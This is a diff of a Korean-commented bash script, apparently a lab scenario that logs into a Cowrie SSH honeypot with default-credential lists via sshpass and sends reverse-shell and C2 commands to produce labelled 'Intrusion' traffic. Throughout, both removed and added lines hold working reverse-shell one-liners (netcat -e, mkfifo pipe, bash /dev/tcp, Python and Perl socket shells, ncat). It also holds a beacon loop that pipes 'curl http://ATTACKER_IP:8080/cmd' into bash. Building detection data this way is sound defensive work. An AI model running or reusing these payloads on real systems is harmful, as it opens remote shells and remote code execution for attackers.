@@ -1,54 +1,47 @@
 #!/bin/bash
 # 시나리오 06: 리버스 셸 / C2 통신
 # Label: Intrusion
-# 도구: SSH + netcat, python3
-# 설명: Cowrie에 SSH 로그인 후 리버스 셸 명령어 실행
-# (Cowrie는 명령어를 기록하고 has_reverse_shell 피처를 생성함)
+# 설명: 다양한 리버스셸 기법 - 매 실행마다 기법 + 계정 랜덤
 
 LABEL="Intrusion"
 SCENARIO="reverse_shell"
 echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
 
-SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p 2222"
-C2_IP="172.30.0.20"
-C2_PORT="4444"
+source /attack_scenarios/lib/common.sh
 
-# netcat 리버스 셸 시도 (root)
-echo "[*] Netcat reverse shell attempt"
-sshpass -p "password" ssh $SSH_OPTS root@172.30.0.10 << ENDSSH 2>/dev/null || true
-nc ${C2_IP} ${C2_PORT} -e /bin/bash
-nc -e /bin/sh ${C2_IP} ${C2_PORT}
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${C2_IP} ${C2_PORT} > /tmp/f
-ENDSSH
+SSH_USERS=("root" "admin" "pi" "ubuntu" "user" "test" "guest" "operator")
+SSH_PASSES=("password" "admin" "123456" "raspberry" "ubuntu" "root" "letmein" "test" "user")
 
-# bash /dev/tcp 리버스 셸 시도 (admin)
-echo "[*] Bash /dev/tcp reverse shell attempt"
-sshpass -p "admin" ssh $SSH_OPTS admin@172.30.0.10 << ENDSSH 2>/dev/null || true
-bash -i >& /dev/tcp/${C2_IP}/${C2_PORT} 0>&1
-exec 5<>/dev/tcp/${C2_IP}/${C2_PORT}; cat <&5 | while read line; do \$line 2>&5 >&5; done
-ENDSSH
+N=$(rand_int 3 6)
+for i in $(seq 1 $N); do
+    user=$(rand_pick "${SSH_USERS[@]}")
+    pass=$(rand_pick "${SSH_PASSES[@]}")
+    shell=$(rand_pick "${REVSHELL_POOL[@]}")
 
-# Python3 리버스 셸 시도 (pi)
-echo "[*] Python3 reverse shell attempt"
-sshpass -p "raspberry" ssh $SSH_OPTS pi@172.30.0.10 << ENDSSH 2>/dev/null || true
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${C2_IP}",${C2_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("${C2_IP}",${C2_PORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
-ENDSSH
+    echo "[*] 리버스셸 시도: ${user}@cowrie ($(echo $shell | cut -c1-40)...)"
+    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} "$shell" 2>/dev/null || true
+    rand_sleep 1 3
+done
 
-# Perl 리버스 셸 시도 (test)
-echo "[*] Perl reverse shell attempt"
-sshpass -p "test" ssh $SSH_OPTS test@172.30.0.10 << ENDSSH 2>/dev/null || true
-perl -e 'use Socket;\$i="${C2_IP}";\$p=${C2_PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-ENDSSH
-
-# C2 비콘 시뮬레이션 (wget/curl을 통한 C2 통신)
+# C2 비콘 시뮬레이션
 echo "[*] C2 beacon simulation"
-sshpass -p "user" ssh $SSH_OPTS user@172.30.0.10 << ENDSSH 2>/dev/null || true
-while true; do
-  curl -s http://${C2_IP}:8080/cmd | bash
-  wget -qO- http://${C2_IP}:8080/beacon > /dev/null
-  sleep 60
-done &
-ENDSSH
+user=$(rand_pick "${SSH_USERS[@]}")
+pass=$(rand_pick "${SSH_PASSES[@]}")
+interval=$(rand_int 30 120)
+sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} \
+    "while true; do curl -s http://${ATTACKER_IP}:8080/cmd | bash; sleep ${interval}; done &" \
+    2>/dev/null || true
+
+# 추가 셸 기법들
+echo "[*] Alternative shell techniques"
+for payload in \
+    "exec 5<>/dev/tcp/${ATTACKER_IP}/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done" \
+    "0<&196;exec 196<>/dev/tcp/${ATTACKER_IP}/4444; sh <&196 >&196 2>&196" \
+    "ncat ${ATTACKER_IP} 4444 -e /bin/bash"; do
+    user=$(rand_pick "${SSH_USERS[@]}")
+    pass=$(rand_pick "${SSH_PASSES[@]}")
+    sshpass -p "$pass" ssh $SSH_OPTS ${user}@${COWRIE_IP} "$payload" 2>/dev/null || true
+    rand_sleep 0 2
+done
 
 echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
